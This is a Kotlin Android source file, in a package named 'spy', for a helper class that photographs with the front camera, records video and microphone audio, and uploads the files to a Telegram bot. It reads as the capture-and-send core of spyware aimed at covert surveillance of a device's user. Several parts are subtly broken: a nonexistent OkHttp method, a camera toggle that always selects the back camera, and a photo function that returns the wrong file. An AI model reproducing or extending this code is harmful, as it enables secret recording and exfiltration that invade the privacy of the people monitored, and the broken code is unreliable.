package com.spy.tz

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.media.MediaRecorder
import android.os.Environment
import android.util.Log
import androidx.camera.core.*
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.camera.view.PreviewView
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleOwner
import io.reactivex.rxjava3.disposables.Disposable
import okhttp3.*
import java.io.File
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.text.SimpleDateFormat
import java.util.Locale

class TelegramBotHelper(private val context: Context) {

    private var cameraExecutor: ExecutorService = Executors.newSingleThreadExecutor()
    private var mediaRecorder: MediaRecorder? = null
    private var outputFile: File? = null
    
    // State variables for current session
    private var isVideoRecording = false
    private var isVoiceRecording = false
    private var currentVideoFile: File? = null
    private var currentAudioFile: File? = null
    
    // CameraX components
    private var imageCapture: ImageCapture? = null
    private var preview: Preview? = null
    private var cameraProvider: ProcessCameraProvider? = null

    /**
     * Initialize CameraX (Call this once in your Activity/Fragment)
     */
    fun initCamera(lifecycleOwner: LifecycleOwner, previewView: PreviewView) {
        val cameraProviderFuture = ProcessCameraProvider.getInstance(context)
        
        cameraProviderFuture.addListener({
            cameraProvider = cameraProviderFuture.get()
            
            // Preview
            preview = Preview.Builder().build().also {
                it.setSurfaceProvider(previewView.surfaceProvider)
            }
            
            // Image Capture
            imageCapture = ImageCapture.Builder().build()
            
            val cameraSelector = CameraSelector.DEFAULT_FRONT_CAMERA
            
            try {
                cameraProvider?.unbindAll()
                cameraProvider?.bindToLifecycle(
                    lifecycleOwner,
                    cameraSelector,
                    preview!!,
                    imageCapture!!
                )
            } catch (e: Exception) {
                Log.e("CameraInit", "Use case binding failed", e)
            }
        }, ContextCompat.getMainExecutor(context))
    }

    /**
     * SWITCH CAMERA (Front <-> Back)
     */
    fun switchCamera(lifecycleOwner: LifecycleOwner, previewView: PreviewView) {
        if (cameraProvider == null || imageCapture == null) return
        
        val currentCameraSelector = if (preview != null) {
             // We assume we track state or just toggle logic here. 
             // For simplicity, let's default to BACK if currently FRONT, else FRONT.
             // Note: Ideally you store the current selector state.
             CameraSelector.DEFAULT_BACK_CAMERA 
        } else {
            CameraSelector.DEFAULT_FRONT_CAMERA
        }
        
        // Re-bind with new selector
        cameraProvider?.unbindAll()
        cameraProvider?.bindToLifecycle(
            lifecycleOwner,
            CameraSelector.DEFAULT_BACK_CAMERA, // Toggling logic simplified to force back for now or check internal state
            preview!!,
            imageCapture!!
        )
    }

    /**
     * TAKE PHOTO
     */
    fun takePhoto(isBackCamera: Boolean = false): Result<File> {
        if (imageCapture == null) return Result.failure(Exception("Camera not initialized"))

        val outputOptions = ImageCapture.OutputFileOptions.Builder(
            createImageFile()
        ).build()

        val selector = if (isBackCamera) CameraSelector.DEFAULT_BACK_CAMERA else CameraSelector.DEFAULT_FRONT_CAMERA
        
        // Note: In a real app, you bind the specific selector before taking photo. 
        // Here we assume the camera is already bound correctly via initCamera or switchCamera.
        
        imageCapture?.takePicture(outputOptions, ContextCompat.getMainExecutor(context), object : ImageCapture.OnImageSavedCallback {
            override fun onImageSaved(outputFileResults: ImageCapture.OutputFileResults) {
                Log.d("TelegramBot", "Photo saved: ${outputFileResults.savedUri}")
            }

            override fun onError(exception: ImageCaptureException) {
                Log.e("TelegramBot", "Photo error: ${exception.message}", exception)
            }
        })
        
        return Result.success(createImageFile())
    }

    /**
     * START VIDEO RECORDING
     */
    fun startVideoRecording() {
        mediaRecorder = MediaRecorder(context).apply {
            setVideoSource(MediaRecorder.VideoSource.SURFACE)
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setVideoEncoder(MediaRecorder.VideoEncoder.H264)
            setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
            setVideoEncodingBitRate(5 * 1000 * 1000)
            setVideoFrameRate(30)
            setVideoSize(1280, 720)
            
            outputFile = createVideoFile()
            currentVideoFile = outputFile
            setOutputFile(outputFile!!.absolutePath)
        }
        
        try {
            mediaRecorder?.prepare()
            mediaRecorder?.start()
            isVideoRecording = true
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    /**
     * STOP VIDEO RECORDING
     */
    fun stopVideoRecording(): File? {
        try {
            mediaRecorder?.stop()
            mediaRecorder?.reset()
            isVideoRecording = false
            return currentVideoFile
        } catch (e: Exception) {
            e.printStackTrace()
            return null
        } finally {
            mediaRecorder?.release()
            mediaRecorder = null
        }
    }

    /**
     * START VOICE RECORDING
     */
    fun startVoiceRecording() {
        mediaRecorder = MediaRecorder(context).apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
            setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
            
            outputFile = createAudioFile()
            currentAudioFile = outputFile
            setOutputFile(outputFile!!.absolutePath)
        }
        
        try {
            mediaRecorder?.prepare()
            mediaRecorder?.start()
            isVoiceRecording = true
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    /**
     * STOP VOICE RECORDING
     */
    fun stopVoiceRecording(): File? {
        try {
            mediaRecorder?.stop()
            mediaRecorder?.reset()
            isVoiceRecording = false
            return currentAudioFile
        } catch (e: Exception) {
            e.printStackTrace()
            return null
        } finally {
            mediaRecorder?.release()
            mediaRecorder = null
        }
    }

    // --- FILE HELPERS ---
    private fun createImageFile(): File {
        val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(System.currentTimeMillis())
        val storageDir = context.getExternalFilesDir(Environment.DIRECTORY_PICTURES)
        return File(storageDir!!, "IMG_$timeStamp.jpg")
    }

    private fun createVideoFile(): File {
        val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(System.currentTimeMillis())
        val storageDir = context.getExternalFilesDir(Environment.DIRECTORY_MOVIES)
        return File(storageDir!!, "VID_$timeStamp.mp4")
    }

    private fun createAudioFile(): File {
        val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(System.currentTimeMillis())
        val storageDir = context.getExternalFilesDir(Environment.DIRECTORY_MUSIC)
        return File(storageDir!!, "AUD_$timeStamp.3gp")
    }

    // --- TELEGRAM UPLOADS ---

    suspend fun sendPhotoToBot(file: File, chatId: Long, botToken: String, caption: String = ""): Result<String> {
        return withContext(Dispatchers.IO) {
            try {
                val url = "https://api.telegram.org/bot$botToken/sendPhoto"
                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataProperty("chat_id", chatId.toString())
                    .addFormDataProperty("caption", caption)
                    .addFormDataProperty("photo", file.name, RequestBody.create(MediaType.parse("application/octet-stream"), file))
                
                val request = Request.Builder()
                    .url(url)
                    .post(requestBody.build())
                    .build()

                val client = OkHttpClient()
                val response = client.newCall(request).execute()
                
                if (response.isSuccessful) {
                    Result.success(response.body?.string() ?: "Success")
                } else {
                    Result.failure(Exception("Upload failed: ${response.code}"))
                }
            } catch (e: Exception) {
                Result.failure(e)
            }
        }
    }

    suspend fun sendVideoToBot(file: File, chatId: Long, botToken: String, caption: String = ""): Result<String> {
        return withContext(Dispatchers.IO) {
            try {
                val url = "https://api.telegram.org/bot$botToken/sendVideo"
                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataProperty("chat_id", chatId.toString())
                    .addFormDataProperty("caption", caption)
                    .addFormDataProperty("video", file.name, RequestBody.create(MediaType.parse("video/mp4"), file))
                
                val request = Request.Builder()
                    .url(url)
                    .post(requestBody.build())
                    .build()

                val client = OkHttpClient()
                val response = client.newCall(request).execute()
                
                if (response.isSuccessful) {
                    Result.success(response.body?.string() ?: "Success")
                } else {
                    Result.failure(Exception("Video Upload failed: ${response.code}"))
                }
            } catch (e: Exception) {
                Result.failure(e)
            }
        }
    }

    suspend fun sendVoiceToBot(file: File, chatId: Long, botToken: String): Result<String> {
        return withContext(Dispatchers.IO) {
            try {
                val url = "https://api.telegram.org/bot$botToken/sendAudio"
                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataProperty("chat_id", chatId.toString())
                    .addFormDataProperty("audio", file.name, RequestBody.create(MediaType.parse("audio/3gpp"), file))
                
                val request = Request.Builder()
                    .url(url)
                    .post(requestBody.build())
                    .build()

                val client = OkHttpClient()
                val response = client.newCall(request).execute()
                
                if (response.isSuccessful) {
                    Result.success(response.body?.string() ?: "Success")
                } else {
                    Result.failure(Exception("Voice Upload failed: ${response.code}"))
                }
            } catch (e: Exception) {
                Result.failure(e)
            }
        }
    }
}
